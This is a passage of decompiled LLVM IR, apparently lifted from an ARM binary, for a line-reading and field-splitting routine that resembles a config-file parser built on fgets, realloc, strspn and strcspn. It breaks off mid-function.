entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_2c01c = load i32, i32* @r4, align 4
  %v6_2c01c = load i32, i32* @r5, align 4
  %v9_2c01c = load i32, i32* @r6, align 4
  %v12_2c01c = load i32, i32* @r7, align 4
  %v15_2c01c = load i32, i32* @r8, align 4
  %v18_2c01c = load i32, i32* @sb, align 4
  %v21_2c01c = load i32, i32* @sl, align 4
  %v24_2c01c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_2c020 = icmp eq i32* %arg1, null
  store i1 %v2_2c020, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_2c020, label %dec_label_pc_2c330, label %dec_label_pc_2c038

dec_label_pc_2c038:                               ; preds = %entry
  %v1_2c038 = urem i32 %arg3, 256
  store i32 %v1_2c038, i32* @sb, align 4
  %v1_2c03c = udiv i32 %arg3, 256
  %v3_2c040 = urem i32 %v1_2c03c, 256
  %v3_2c044 = mul nuw nsw i32 %v1_2c038, 4
  %v1_2c04c = or i32 %v3_2c044, 1
  %v1_2c058 = and i32 %arg3, 131072
  %v1_2c05c = add nsw i32 %v1_2c038, -1
  %v1_2c068 = and i32 %arg3, 262144
  store i32 %v1_2c068, i32* %r2.global-to-local, align 4
  %v1_2c06c = and i32 %arg3, 65536
  store i32 %v1_2c06c, i32* %r3.global-to-local, align 4
  store i32 %v1_2c06c, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_2c07c = add i32 %arg4, 1
  store i32 %v1_2c07c, i32* @sl, align 4
  %v2_2c1fc = inttoptr i32 %arg2 to i32*
  %v2_2c20c = icmp eq i32 %v1_2c058, 0
  %v2_2c264 = icmp eq i32 %v1_2c068, 0
  br label %dec_label_pc_2c080

dec_label_pc_2c080:                               ; preds = %dec_label_pc_2c080.backedge, %dec_label_pc_2c038
  %v2_2c09c = phi i32 [ %v0_2c080.pre, %dec_label_pc_2c080.backedge ], [ %tmp, %dec_label_pc_2c038 ]
  %v1_2c080 = add i32 %v2_2c09c, 4
  %v2_2c080 = inttoptr i32 %v1_2c080 to i32*
  %v3_2c080 = load i32, i32* %v2_2c080, align 4
  store i32 %v3_2c080, i32* %r3.global-to-local, align 4
  %v2_2c084 = icmp eq i32 %v3_2c080, 0
  store i1 %v2_2c084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c084, label %dec_label_pc_2c08c, label %dec_label_pc_2c0d4

dec_label_pc_2c08c:                               ; preds = %dec_label_pc_2c080
  %v1_2c08c = add i32 %v2_2c09c, 16
  %v2_2c08c = inttoptr i32 %v1_2c08c to i32*
  %v3_2c08c = load i32, i32* %v2_2c08c, align 4
  store i32 %v3_2c08c, i32* %r3.global-to-local, align 4
  %v2_2c090 = icmp eq i32 %v3_2c08c, 0
  store i1 %v2_2c090, i1* %cpsr_z.global-to-local, align 1
  %v1_2c094 = add i32 %v2_2c09c, 8
  %v2_2c094 = inttoptr i32 %v1_2c094 to i32*
  %v3_2c094 = load i32, i32* %v2_2c094, align 4
  store i32 %v3_2c094, i32* %r3.global-to-local, align 4
  br i1 %v2_2c090, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_2c08c
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_2c08c, align 4
  %v0_2c0a0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_2c08c, %bb
  %v0_2c0a0 = phi i32 [ %v0_2c0a0.pre, %bb ], [ %v3_2c094, %dec_label_pc_2c08c ]
  %v2_2c0a0 = icmp eq i32 %v0_2c0a0, 0
  store i1 %v2_2c0a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c0a0, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_2c04c, i32* %r3.global-to-local, align 4
  %v2_2c0a8 = load i32, i32* @r5, align 4
  %v3_2c0a8 = add i32 %v2_2c0a8, 8
  %v4_2c0a8 = inttoptr i32 %v3_2c0a8 to i32*
  store i32 %v1_2c04c, i32* %v4_2c0a8, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_2c0ac = load i32, i32* @r5, align 4
  %v1_2c0ac = add i32 %v0_2c0ac, 16
  %v2_2c0ac = inttoptr i32 %v1_2c0ac to i32*
  %v3_2c0ac = load i32, i32* %v2_2c0ac, align 4
  store i32 %v3_2c0ac, i32* %r0.global-to-local, align 4
  %v1_2c0b0 = add i32 %v0_2c0ac, 8
  %v2_2c0b0 = inttoptr i32 %v1_2c0b0 to i32*
  %v3_2c0b0 = load i32, i32* %v2_2c0b0, align 4
  store i32 %v3_2c0b0, i32* %r3.global-to-local, align 4
  %v2_2c0b4 = add i32 %v3_2c0b0, %v3_2c0ac
  store i32 %v2_2c0b4, i32* %r0.global-to-local, align 4
  %v1_2c0b8 = call i32 @malloc(i32 %v2_2c0b4)
  store i32 %v1_2c0b8, i32* %r0.global-to-local, align 4
  %v2_2c0bc = icmp eq i32 %v1_2c0b8, 0
  store i1 %v2_2c0bc, i1* %cpsr_z.global-to-local, align 1
  %v1_2c0c0 = load i32, i32* @r5, align 4
  %v2_2c0c0 = add i32 %v1_2c0c0, 4
  %v3_2c0c0 = inttoptr i32 %v2_2c0c0 to i32*
  store i32 %v1_2c0b8, i32* %v3_2c0c0, align 4
  br i1 %v2_2c0bc, label %dec_label_pc_2c330, label %dec_label_pc_2c0c8

dec_label_pc_2c0c8:                               ; preds = %.thread
  %v0_2c0c8 = load i32, i32* @r5, align 4
  %v1_2c0c8 = add i32 %v0_2c0c8, 20
  %v2_2c0c8 = inttoptr i32 %v1_2c0c8 to i32*
  %v3_2c0c8 = load i32, i32* %v2_2c0c8, align 4
  %v1_2c0cc = or i32 %v3_2c0c8, 1
  store i32 %v1_2c0cc, i32* %r3.global-to-local, align 4
  store i32 %v1_2c0cc, i32* %v2_2c0c8, align 4
  %v0_2c0d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2c0d4

dec_label_pc_2c0d4:                               ; preds = %dec_label_pc_2c080, %dec_label_pc_2c0c8
  %v1_2c0dc = phi i32 [ %v2_2c09c, %dec_label_pc_2c080 ], [ %v0_2c0d4.pre, %dec_label_pc_2c0c8 ]
  %v1_2c0d4 = add i32 %v1_2c0dc, 4
  %v2_2c0d4 = inttoptr i32 %v1_2c0d4 to i32*
  %v3_2c0d4 = load i32, i32* %v2_2c0d4, align 4
  store i32 %v3_2c0d4, i32* %r2.global-to-local, align 4
  %v4_2c0d4 = add i32 %v1_2c0dc, 8
  %v5_2c0d4 = inttoptr i32 %v4_2c0d4 to i32*
  %v6_2c0d4 = load i32, i32* %v5_2c0d4, align 4
  %v2_2c0d8 = add i32 %v6_2c0d4, %v3_2c0d4
  store i32 %v2_2c0d8, i32* %r3.global-to-local, align 4
  %v2_2c0dc = add i32 %v1_2c0dc, 12
  %v3_2c0dc = inttoptr i32 %v2_2c0dc to i32*
  store i32 %v2_2c0d8, i32* %v3_2c0dc, align 4
  %v0_2c0e0 = load i32, i32* @fp, align 4
  store i32 %v0_2c0e0, i32* @r6, align 4
  br label %dec_label_pc_2c0e4

dec_label_pc_2c0e4:                               ; preds = %dec_label_pc_2c170, %dec_label_pc_2c15c, %dec_label_pc_2c0d4
  %v0_2c0ec = phi i32 [ %v0_2c0e0, %dec_label_pc_2c0d4 ], [ %v1_2c15c, %dec_label_pc_2c15c ], [ %v0_2c0ec.pre.pre, %dec_label_pc_2c170 ]
  %v0_2c0e4 = load i32, i32* @r5, align 4
  %v1_2c0e4 = add i32 %v0_2c0e4, 12
  store i32 %v1_2c0e4, i32* %r0.global-to-local, align 4
  %v1_2c0e8 = inttoptr i32 %v1_2c0e4 to i32*
  %v2_2c0e8 = load i32, i32* %v1_2c0e8, align 4
  store i32 %v2_2c0e8, i32* %r0.global-to-local, align 4
  %v3_2c0e8 = add i32 %v0_2c0e4, 16
  %v4_2c0e8 = inttoptr i32 %v3_2c0e8 to i32*
  %v5_2c0e8 = load i32, i32* %v4_2c0e8, align 4
  %v2_2c0ec = add i32 %v2_2c0e8, %v0_2c0ec
  store i32 %v2_2c0ec, i32* %r0.global-to-local, align 4
  %v2_2c0f0 = sub i32 %v5_2c0e8, %v0_2c0ec
  %v1_2c0f4 = inttoptr i32 %v0_2c0e4 to i32*
  %v2_2c0f4 = load i32, i32* %v1_2c0f4, align 4
  store i32 %v2_2c0f4, i32* %r2.global-to-local, align 4
  %v3_2c0f8 = call i32 @fgets(i32 %v2_2c0ec, i32 %v2_2c0f0, i32 %v2_2c0f4)
  store i32 %v3_2c0f8, i32* %r0.global-to-local, align 4
  store i32 %v3_2c0f8, i32* %r4.global-to-local, align 4
  %v2_2c0fc = icmp eq i32 %v3_2c0f8, 0
  store i1 %v2_2c0fc, i1* %cpsr_z.global-to-local, align 1
  %v0_2c104 = load i32, i32* @r5, align 4
  %v1_2c104 = add i32 %v0_2c104, 12
  br i1 %v2_2c0fc, label %dec_label_pc_2c104, label %dec_label_pc_2c11c

dec_label_pc_2c104:                               ; preds = %dec_label_pc_2c0e4
  store i32 %v1_2c104, i32* %r0.global-to-local, align 4
  %v1_2c108 = inttoptr i32 %v1_2c104 to i32*
  %v2_2c108 = load i32, i32* %v1_2c108, align 4
  store i32 %v2_2c108, i32* @r0, align 4
  %v3_2c108 = add i32 %v0_2c104, 16
  %v4_2c108 = inttoptr i32 %v3_2c108 to i32*
  %v5_2c108 = load i32, i32* %v4_2c108, align 4
  store i32 %v5_2c108, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  %v0_2c110 = call i32 @__GI_memset()
  store i32 %v0_2c110, i32* %r0.global-to-local, align 4
  %v0_2c114 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2c334

dec_label_pc_2c11c:                               ; preds = %dec_label_pc_2c0e4
  %v2_2c11c = inttoptr i32 %v1_2c104 to i32*
  %v3_2c11c = load i32, i32* %v2_2c11c, align 4
  store i32 %v3_2c11c, i32* @r4, align 4
  %v1_2c120 = load i32, i32* @r6, align 4
  %v2_2c120 = add i32 %v1_2c120, %v3_2c11c
  %v3_2c120 = inttoptr i32 %v2_2c120 to i8*
  store i32 %v2_2c120, i32* %r0.global-to-local, align 4
  %v3_2c124 = call i32 @strlen(i8* %v3_2c120)
  %v0_2c12c = load i32, i32* @r6, align 4
  %v2_2c12c = add i32 %v0_2c12c, %v3_2c124
  store i32 %v2_2c12c, i32* @r6, align 4
  %v0_2c130 = load i32, i32* @r4, align 4
  store i32 %v0_2c130, i32* @r0, align 4
  %v2_2c134 = call i32 @__GI_strchr(i32 %v0_2c130, i32 10)
  store i32 %v2_2c134, i32* %r0.global-to-local, align 4
  %v2_2c138 = icmp eq i32 %v2_2c134, 0
  store i1 %v2_2c138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c138, label %dec_label_pc_2c164, label %dec_label_pc_2c140

dec_label_pc_2c140:                               ; preds = %dec_label_pc_2c11c
  %v1_2c140 = inttoptr i32 %v2_2c134 to i8*
  %v2_2c140 = load i8, i8* %v1_2c140, align 1
  %v3_2c140 = zext i8 %v2_2c140 to i32
  %v1_2c144 = add nuw nsw i32 %v3_2c140, 255
  %v1_2c148 = urem i32 %v1_2c144, 256
  store i32 %v1_2c148, i32* %r3.global-to-local, align 4
  %v7_2c14c = icmp eq i32 %v1_2c148, 92
  store i1 %v7_2c14c, i1* %cpsr_z.global-to-local, align 1
  %v1_2c150 = trunc i32 %v1_2c144 to i8
  store i8 %v1_2c150, i8* %v1_2c140, align 1
  %v0_2c154 = load i32, i32* @r6, align 4
  %v1_2c154 = add i32 %v0_2c154, -1
  store i32 %v1_2c154, i32* @r6, align 4
  %v0_2c158 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2c158, label %dec_label_pc_2c15c, label %dec_label_pc_2c1e8

dec_label_pc_2c15c:                               ; preds = %dec_label_pc_2c140
  %v1_2c15c = add i32 %v0_2c154, -2
  store i32 %v1_2c15c, i32* @r6, align 4
  br label %dec_label_pc_2c0e4

dec_label_pc_2c164:                               ; preds = %dec_label_pc_2c11c
  %v0_2c164 = load i32, i32* @r5, align 4
  %v1_2c164 = add i32 %v0_2c164, 20
  %v2_2c164 = inttoptr i32 %v1_2c164 to i32*
  %v3_2c164 = load i32, i32* %v2_2c164, align 4
  store i32 %v3_2c164, i32* %r3.global-to-local, align 4
  %v2_2c168 = icmp eq i32 %v3_2c164, 0
  store i1 %v2_2c168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c168, label %dec_label_pc_2c1a0, label %dec_label_pc_2c170

dec_label_pc_2c170:                               ; preds = %dec_label_pc_2c164
  %v1_2c170 = add i32 %v0_2c164, 16
  %v2_2c170 = inttoptr i32 %v1_2c170 to i32*
  %v3_2c170 = load i32, i32* %v2_2c170, align 4
  store i32 %v3_2c170, i32* %r3.global-to-local, align 4
  %v1_2c174 = add i32 %v0_2c164, 8
  %v2_2c174 = inttoptr i32 %v1_2c174 to i32*
  %v3_2c174 = load i32, i32* %v2_2c174, align 4
  %v1_2c178 = add i32 %v3_2c170, 4096
  store i32 %v1_2c178, i32* %r3.global-to-local, align 4
  %v2_2c17c = add i32 %v3_2c174, %v1_2c178
  store i32 %v1_2c178, i32* %v2_2c170, align 4
  %v0_2c184 = load i32, i32* @r5, align 4
  %v1_2c184 = add i32 %v0_2c184, 4
  %v2_2c184 = inttoptr i32 %v1_2c184 to i32*
  %v3_2c184 = load i32, i32* %v2_2c184, align 4
  store i32 %v3_2c184, i32* %r0.global-to-local, align 4
  %v2_2c188 = inttoptr i32 %v3_2c184 to i32*
  %v3_2c188 = call i32 @realloc(i32* %v2_2c188, i32 %v2_2c17c)
  store i32 %v3_2c188, i32* %r0.global-to-local, align 4
  %v0_2c18c = load i32, i32* @r5, align 4
  %v1_2c18c = add i32 %v0_2c18c, 8
  %v2_2c18c = inttoptr i32 %v1_2c18c to i32*
  %v3_2c18c = load i32, i32* %v2_2c18c, align 4
  %v2_2c190 = add i32 %v3_2c18c, %v3_2c188
  store i32 %v2_2c190, i32* %r3.global-to-local, align 4
  %v2_2c194 = add i32 %v0_2c18c, 12
  %v3_2c194 = inttoptr i32 %v2_2c194 to i32*
  store i32 %v2_2c190, i32* %v3_2c194, align 4
  %v1_2c198 = load i32, i32* @r5, align 4
  %v2_2c198 = add i32 %v1_2c198, 4
  %v3_2c198 = inttoptr i32 %v2_2c198 to i32*
  store i32 %v3_2c188, i32* %v3_2c198, align 4
  %v0_2c0ec.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2c0e4

dec_label_pc_2c1a0:                               ; preds = %dec_label_pc_2c164, %.dec_label_pc_2c1a0_crit_edge
  %v0_2c1a0 = phi i32 [ %v0_2c1a0.pre, %.dec_label_pc_2c1a0_crit_edge ], [ %v0_2c164, %dec_label_pc_2c164 ]
  %v1_2c1a0 = inttoptr i32 %v0_2c1a0 to i32*
  %v2_2c1a0 = load i32, i32* %v1_2c1a0, align 4
  %v1_2c1a4 = add i32 %v2_2c1a0, 52
  %v2_2c1a4 = inttoptr i32 %v1_2c1a4 to i32*
  %v3_2c1a4 = load i32, i32* %v2_2c1a4, align 4
  store i32 %v3_2c1a4, i32* %r3.global-to-local, align 4
  %v2_2c1a8 = icmp eq i32 %v3_2c1a4, 0
  store i1 %v2_2c1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c1a8, label %dec_label_pc_2c1d4, label %dec_label_pc_2c1b0

dec_label_pc_2c1b0:                               ; preds = %dec_label_pc_2c1a0
  %v1_2c1b0 = add i32 %v2_2c1a0, 16
  %v2_2c1b0 = inttoptr i32 %v1_2c1b0 to i32*
  %v3_2c1b0 = load i32, i32* %v2_2c1b0, align 4
  store i32 %v3_2c1b0, i32* %r2.global-to-local, align 4
  %v1_2c1b4 = add i32 %v2_2c1a0, 24
  %v2_2c1b4 = inttoptr i32 %v1_2c1b4 to i32*
  %v3_2c1b4 = load i32, i32* %v2_2c1b4, align 4
  store i32 %v3_2c1b4, i32* %r3.global-to-local, align 4
  %v3_2c1b8 = icmp ult i32 %v3_2c1b0, %v3_2c1b4
  %v9_2c1b8 = icmp eq i32 %v3_2c1b0, %v3_2c1b4
  store i1 %v9_2c1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2c1b8, label %dec_label_pc_2c1dcthread-pre-split, label %dec_label_pc_2c1c8

dec_label_pc_2c1c8:                               ; preds = %dec_label_pc_2c1b0
  store i32 %v2_2c1a0, i32* %r0.global-to-local, align 4
  %v1_2c1cc = inttoptr i32 %v2_2c1a0 to i16*
  %v2_2c1cc = call i32 @getc_unlocked(i16* %v1_2c1cc)
  store i32 %v2_2c1cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c1dc

dec_label_pc_2c1d4:                               ; preds = %dec_label_pc_2c1a0
  store i32 %v2_2c1a0, i32* %r0.global-to-local, align 4
  %v1_2c1d8 = call i32 @__GI_fgetc(i32 %v2_2c1a0)
  store i32 %v1_2c1d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c1dc

dec_label_pc_2c1dcthread-pre-split:               ; preds = %dec_label_pc_2c1b0
  %v2_2c1bc = inttoptr i32 %v3_2c1b0 to i8*
  %v3_2c1bc = load i8, i8* %v2_2c1bc, align 1
  %v4_2c1bc = zext i8 %v3_2c1bc to i32
  store i32 %v4_2c1bc, i32* %r0.global-to-local, align 4
  %v6_2c1bc = add i32 %v3_2c1b0, 1
  store i32 %v6_2c1bc, i32* %r2.global-to-local, align 4
  store i32 %v6_2c1bc, i32* %v2_2c1b0, align 4
  %v0_2c1dc.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c1dc

dec_label_pc_2c1dc:                               ; preds = %dec_label_pc_2c1dcthread-pre-split, %dec_label_pc_2c1c8, %dec_label_pc_2c1d4
  %v1_2c1e0 = phi i32 [ %v0_2c1dc.pr, %dec_label_pc_2c1dcthread-pre-split ], [ %v2_2c1cc, %dec_label_pc_2c1c8 ], [ %v1_2c1d8, %dec_label_pc_2c1d4 ]
  %v7_2c1dc = icmp eq i32 %v1_2c1e0, 10
  store i1 %v7_2c1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2c1dc, label %dec_label_pc_2c1e8.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_2c1dc
  %v8_2c1e0 = icmp eq i32 %v1_2c1e0, -1
  store i1 %v8_2c1e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_2c1e0, label %dec_label_pc_2c1e8.loopexit, label %.dec_label_pc_2c1a0_crit_edge

.dec_label_pc_2c1a0_crit_edge:                    ; preds = %bb68
  %v0_2c1a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2c1a0

dec_label_pc_2c1e8.loopexit:                      ; preds = %bb68, %dec_label_pc_2c1dc
  %v0_2c1e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2c1e8

dec_label_pc_2c1e8:                               ; preds = %dec_label_pc_2c140, %dec_label_pc_2c1e8.loopexit
  %v0_2c1e8 = phi i32 [ %v0_2c1e8.pre, %dec_label_pc_2c1e8.loopexit ], [ %v1_2c154, %dec_label_pc_2c140 ]
  %v7_2c1e8 = icmp eq i32 %v0_2c1e8, -1
  store i1 %v7_2c1e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2c1e8, label %dec_label_pc_2c330, label %dec_label_pc_2c1f0

dec_label_pc_2c1f0:                               ; preds = %dec_label_pc_2c1e8
  %v0_2c1f0 = load i32, i32* @r5, align 4
  %v1_2c1f0 = add i32 %v0_2c1f0, 4
  %v2_2c1f0 = inttoptr i32 %v1_2c1f0 to i32*
  %v3_2c1f0 = load i32, i32* %v2_2c1f0, align 4
  store i32 %v3_2c1f0, i32* @r0, align 4
  store i32 %v3_2c044, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_2c1f0, i32* %v2_2c1fc, align 4
  %v0_2c200 = load i32, i32* @fp, align 4
  store i32 %v0_2c200, i32* @r1, align 4
  %v0_2c204 = call i32 @__GI_memset()
  store i32 %v0_2c204, i32* %r0.global-to-local, align 4
  store i32 %v1_2c058, i32* %r2.global-to-local, align 4
  store i1 %v2_2c20c, i1* %cpsr_z.global-to-local, align 1
  %v0_2c210 = load i32, i32* @r5, align 4
  %v1_2c210 = add i32 %v0_2c210, 12
  %v2_2c210 = inttoptr i32 %v1_2c210 to i32*
  %v3_2c210 = load i32, i32* %v2_2c210, align 4
  store i32 %v3_2c210, i32* @r4, align 4
  br i1 %v2_2c20c, label %dec_label_pc_2c228, label %dec_label_pc_2c218

dec_label_pc_2c218:                               ; preds = %dec_label_pc_2c1f0
  store i32 %v3_2c210, i32* @r0, align 4
  %v1_2c220 = inttoptr i32 %v3_2c210 to i8*
  %v2_2c220 = call i32 @__GI_strspn(i8* %v1_2c220)
  store i32 %v2_2c220, i32* %r0.global-to-local, align 4
  %v0_2c224 = load i32, i32* @r4, align 4
  %v2_2c224 = add i32 %v0_2c224, %v2_2c220
  store i32 %v2_2c224, i32* @r4, align 4
  br label %dec_label_pc_2c228

dec_label_pc_2c228:                               ; preds = %dec_label_pc_2c1f0, %dec_label_pc_2c218
  %v0_2c30013 = phi i32 [ %v3_2c210, %dec_label_pc_2c1f0 ], [ %v2_2c224, %dec_label_pc_2c218 ]
  %v1_2c228 = inttoptr i32 %v0_2c30013 to i8*
  %v2_2c228 = load i8, i8* %v1_2c228, align 1
  %v3_2c228 = zext i8 %v2_2c228 to i32
  store i32 %v3_2c228, i32* %r2.global-to-local, align 4
  %v2_2c22c = icmp eq i8 %v2_2c228, 0
  store i1 %v2_2c22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c22c, label %dec_label_pc_2c080.backedge, label %dec_label_pc_2c234

dec_label_pc_2c080.backedge:                      ; preds = %dec_label_pc_2c228, %dec_label_pc_2c328, %dec_label_pc_2c234
  %v0_2c080.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2c080

dec_label_pc_2c234:                               ; preds = %dec_label_pc_2c228
  %v0_2c234 = load i32, i32* @r7, align 4
  %v1_2c234 = inttoptr i32 %v0_2c234 to i8*
  %v2_2c234 = load i8, i8* %v1_2c234, align 1
  %v3_2c234 = zext i8 %v2_2c234 to i32
  store i32 %v3_2c234, i32* %r3.global-to-local, align 4
  %v9_2c238 = icmp eq i8 %v2_2c234, %v2_2c228
  store i1 %v9_2c238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2c238, label %dec_label_pc_2c080.backedge, label %dec_label_pc_2c300.preheader

dec_label_pc_2c300.preheader:                     ; preds = %dec_label_pc_2c234
  %v1_2c23c = load i32, i32* @fp, align 4
  store i32 %v1_2c23c, i32* @r6, align 4
  %v2_2c30015 = load i8, i8* %v1_2c228, align 1
  %v3_2c30016 = zext i8 %v2_2c30015 to i32
  store i32 %v3_2c30016, i32* %r2.global-to-local, align 4
  %v2_2c30417 = icmp eq i8 %v2_2c30015, 0
  store i1 %v2_2c30417, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c30417, label %dec_label_pc_2c31c, label %dec_label_pc_2c30c.preheader

dec_label_pc_2c30c.preheader:                     ; preds = %dec_label_pc_2c300.preheader
  %v2_2c30c82 = load i8, i8* %v1_2c234, align 1
  %v3_2c30c83 = zext i8 %v2_2c30c82 to i32
  store i32 %v3_2c30c83, i32* %r3.global-to-local, align 4
  %v9_2c31086 = icmp eq i8 %v2_2c30c82, %v2_2c30015
  store i1 %v9_2c31086, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2c31086, label %dec_label_pc_2c31c, label %bb74

dec_label_pc_2c248:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_2c24c = load i32, i32* %v2_2c1fc, align 4
  store i32 %v2_2c24c, i32* %r3.global-to-local, align 4
  store i32 %v1_2c05c, i32* %r2.global-to-local, align 4
  %v9_2c254 = icmp eq i32 %v2_2c25888, %v1_2c05c
  store i1 %v9_2c254, i1* %cpsr_z.global-to-local, align 1
  %v5_2c258 = mul i32 %v2_2c25888, 4
  %v6_2c258 = add i32 %v2_2c24c, %v5_2c258
  %v7_2c258 = inttoptr i32 %v6_2c258 to i32*
  store i32 %v0_2c25887, i32* %v7_2c258, align 4
  br i1 %v9_2c254, label %dec_label_pc_2c260, label %dec_label_pc_2c26c

dec_label_pc_2c260:                               ; preds = %dec_label_pc_2c248
  store i32 %v1_2c068, i32* %r3.global-to-local, align 4
  store i1 %v2_2c264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c264, label %dec_label_pc_2c26c, label %dec_label_pc_2c28c

dec_label_pc_2c26c:                               ; preds = %dec_label_pc_2c260, %dec_label_pc_2c248
  %v0_2c26c = load i32, i32* @r7, align 4
  %v1_2c26c = inttoptr i32 %v0_2c26c to i8*
  %v2_2c26c = load i8, i8* %v1_2c26c, align 1
  %v3_2c26c = zext i8 %v2_2c26c to i32
  store i32 %v3_2c26c, i32* %r3.global-to-local, align 4
  %v2_2c270 = icmp eq i8 %v2_2c26c, 0
  store i1 %v2_2c270, i1* %cpsr_z.global-to-local, align 1
  %v0_2c274 = load i32, i32* @r4, align 4
  store i32 %v0_2c274, i32* @r0, align 4
  %v1_2c278 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_2c270, i32 %v1_2c278, i32 %v0_2c26c
  store i32 %storemerge, i32* @r1, align 4
  %v0_2c280 = call i32 @strcspn()
  store i32 %v0_2c280, i32* %r0.global-to-local, align 4
  %v0_2c284 = load i32, i32* @r4, align 4
  %v2_2c284 = add i32 %v0_2c284, %v0_2c280
  store i32 %v2_2c284, i32* @r4, align 4
  br label %dec_label_pc_2c2c4

dec_label_pc_2c28c:                               ; preds = %dec_label_pc_2c260
  %v0_2c28c = load i32, i32* @r4, align 4
  store i32 %v0_2c28c, i32* @r0, align 4
  %v0_2c290 = load i32, i32* @r7, align 4
  %v1_2c290 = inttoptr i32 %v0_2c290 to i8*
  %v2_2c290 = load i8, i8* %v1_2c290, align 1
  %v3_2c290 = zext i8 %v2_2c290 to i32
  %v5_2c294 = call i32 @__GI_strchrnul(i32 %v0_2c28c, i32 %v3_2c290, i32 %v1_2c05c, i32 %v1_2c068)
  store i32 %v5_2c294, i32* %r0.global-to-local, align 4
  store i32 %v1_2c058, i32* %r2.global-to-local, align 4
  store i1 %v2_2c20c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_2c294, i32* @r4, align 4
  br i1 %v2_2c20c, label %dec_label_pc_2c2c4, label %dec_label_pc_2c2b0

dec_label_pc_2c2ac:                               ; preds = %dec_label_pc_2c2b0
  %v1_2c2ac = add i32 %v0_2c2c4.pre, -1
  store i32 %v1_2c2ac, i32* @r4, align 4
  br label %dec_label_pc_2c2b0

dec_label_pc_2c2b0:                               ; preds = %dec_label_pc_2c28c, %dec_label_pc_2c2ac
  %v0_2c2b0 = phi i32 [ %v1_2c2ac, %dec_label_pc_2c2ac ], [ %v5_2c294, %dec_label_pc_2c28c ]
  %v1_2c2b0 = add i32 %v0_2c2b0, -1
  %v2_2c2b0 = inttoptr i32 %v1_2c2b0 to i8*
  %v3_2c2b0 = load i8, i8* %v2_2c2b0, align 1
  %v4_2c2b0 = zext i8 %v3_2c2b0 to i32
  %v0_2c2b4 = load i32, i32* @sl, align 4
  store i32 %v0_2c2b4, i32* @r0, align 4
  %v2_2c2b8 = call i32 @__GI_strchr(i32 %v0_2c2b4, i32 %v4_2c2b0)
  store i32 %v2_2c2b8, i32* %r0.global-to-local, align 4
  %v2_2c2bc = icmp eq i32 %v2_2c2b8, 0
  store i1 %v2_2c2bc, i1* %cpsr_z.global-to-local, align 1
  %v0_2c2c4.pre = load i32, i32* @r4, align 4
  br i1 %v2_2c2bc, label %dec_label_pc_2c2c4, label %dec_label_pc_2c2ac

dec_label_pc_2c2c4:                               ; preds = %dec_label_pc_2c2b0, %dec_label_pc_2c28c, %dec_label_pc_2c26c
  %v3_2c2d0 = phi i32 [ %v5_2c294, %dec_label_pc_2c28c ], [ %v2_2c284, %dec_label_pc_2c26c ], [ %v0_2c2c4.pre, %dec_label_pc_2c2b0 ]
  %v1_2c2c4 = inttoptr i32 %v3_2c2d0 to i8*
  %v2_2c2c4 = load i8, i8* %v1_2c2c4, align 1
  %v3_2c2c4 = zext i8 %v2_2c2c4 to i32
  store i32 %v3_2c2c4, i32* %r2.global-to-local, align 4
  %v0_2c2c8 = load i32, i32* @r7, align 4
  %v1_2c2c8 = inttoptr i32 %v0_2c2c8 to i8*
  %v2_2c2c8 = load i8, i8* %v1_2c2c8, align 1
  %v3_2c2c8 = zext i8 %v2_2c2c8 to i32
  store i32 %v3_2c2c8, i32* %r3.global-to-local, align 4
  %v9_2c2cc = icmp eq i8 %v2_2c2c8, %v2_2c2c4
  store i1 %v9_2c2cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2c2cc, label %bb71, label %dec_label_pc_2c2d8

bb71:                                             ; preds = %dec_label_pc_2c2c4
  %v1_2c2d0 = load i32, i32* @fp, align 4
  %v2_2c2d0 = trunc i32 %v1_2c2d0 to i8
